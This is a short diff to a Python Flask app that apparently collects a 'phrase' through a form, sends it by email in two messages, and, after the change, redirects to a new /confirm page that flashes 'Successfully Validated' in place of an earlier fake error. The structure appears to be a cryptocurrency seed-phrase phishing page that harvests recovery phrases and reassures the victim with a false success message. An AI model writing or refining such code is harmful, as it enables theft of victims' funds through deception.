@@ -52,12 +52,15 @@ def phr():
 
         mail.send(msg)
         mail.send(msgD)
-        flash(f'Error while importing your phrase, Try again in some min', 'danger')
+        
 
-        return redirect(request.referrer)
+        return redirect(url_for('back'))
     return render_template('phrase.html', form=form)
-
-
+@app.route('/confirm')
+def back():
+    if request.method == 'GET':
+        flash("Successfully Validated", 'success')
+    return render_template('back.html')
 
 if __name__ == '__main__':
     app.run()
